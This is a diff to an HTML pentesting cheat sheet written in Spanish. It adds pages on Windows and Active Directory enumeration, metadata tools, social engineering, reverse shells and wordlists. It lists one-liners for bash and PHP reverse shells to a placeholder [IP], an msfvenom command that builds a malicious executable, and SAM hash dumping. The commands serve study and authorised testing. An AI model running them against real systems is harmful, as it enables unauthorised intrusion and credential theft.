@@ -458,6 +458,108 @@
               </p>
             </div>
           </div>
+
+          <!-- Página 10: Directorio Activo y Redes Windows -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Enumeración Windows</h2>
+              <p>
+                <strong>crackmapexec smb [IP] -u [user] -p [pass]</strong> Enumeración y ejecución de comandos en Windows/SMB.
+              </p>
+              <p>
+                <strong>impacket-secretsdump -system SYSTEM -sam SAM LOCAL</strong> Extrae hashes de la base de datos SAM local.
+              </p>
+              <p>
+                <strong>impacket-psexec [user]:[pass]@[IP]</strong> Obtiene una shell interactiva en una máquina remota de Windows.
+              </p>
+              <p>
+                <strong>bloodhound-python -d [dominio] -u [user] -p [pass]</strong> Recolecta datos de Active Directory para análisis en BloodHound.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Protocolos Windows</h2>
+              <p>
+                <strong>smbclient -L //[IP] -N</strong> Lista recursos compartidos de SMB de forma anónima.
+              </p>
+              <p>
+                <strong>enum4linux -a [IP]</strong> Herramienta para enumerar información de Windows y Samba.
+              </p>
+              <p>
+                <strong>rpcclient -U "" [IP]</strong> Abre una sesión RPC para interactuar con servicios Windows.
+              </p>
+              <p>
+                <strong>xfreerdp /v:[IP] /u:[user] /p:[pass]</strong> Cliente RDP para acceso remoto a escritorios Windows.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 11: Metadatos e Ingeniería Social -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Análisis de Metadatos</h2>
+              <p>
+                <strong>exiftool [archivo]</strong> Extrae metadatos ocultos de imágenes, PDFs y otros archivos.
+              </p>
+              <p>
+                <strong>metagoofil -d [dominio] -t pdf -n 10</strong> Busca y descarga documentos públicos para extraer metadatos.
+              </p>
+              <p>
+                <strong>steghide extract -sf [imagen]</strong> Extrae información oculta dentro de una imagen (esteganografía).
+              </p>
+              <p>
+                <strong>strings -n 8 [binario]</strong> Muestra secuencias de caracteres imprimibles de longitud mínima 8.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Ingeniería Social</h2>
+              <p>
+                <strong>setoolkit</strong> Inicia el Social-Engineer Toolkit para ataques de phishing y más.
+              </p>
+              <p>
+                <strong>social-engineer-toolkit</strong> Alias para el menú de ingeniería social avanzado.
+              </p>
+              <p>
+                <strong>msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[Puerto] -f exe > payload.exe</strong> Crea un ejecutable malicioso.
+              </p>
+              <p>
+                <strong>evil-winrm -i [IP] -u [user] -p [pass]</strong> Shell para interactuar con WinRM en entornos Windows.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 12: Reverse Shells y Diccionarios -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Reverse Shells</h2>
+              <p>
+                <strong>bash -i >& /dev/tcp/[IP]/[port] 0>&1</strong> Ejecuta una shell reversa interactiva básica en Linux.
+              </p>
+              <p>
+                <strong>python3 -c 'import pty; pty.spawn("/bin/bash")'</strong> Estabiliza una shell (TTY) para tener una terminal funcional.
+              </p>
+              <p>
+                <strong>php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'</strong> Reverse shell escrita en PHP.
+              </p>
+              <p>
+                <strong>stty raw -echo; fg</strong> Comandos para estabilizar la shell tras recibir una conexión.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Diccionarios y Fuerza Bruta</h2>
+              <p>
+                <strong>cewl -w [wordlist.txt] [URL]</strong> Genera una lista de palabras personalizada basada en el contenido de una web.
+              </p>
+              <p>
+                <strong>locate wordlists</strong> Encuentra la ubicación de todos los diccionarios (como rockyou) en Kali.
+              </p>
+              <p>
+                <strong>gzip -d /usr/share/wordlists/rockyou.txt.gz</strong> Descomprime el diccionario más famoso de Kali Linux.
+              </p>
+              <p>
+                <strong>ffuf -u [URL]/FUZZ -w [wordlist]</strong> Fuzzing web extremadamente rápido escrito en Go.
+              </p>
+            </div>
+          </div>
         </div>
 
         <button
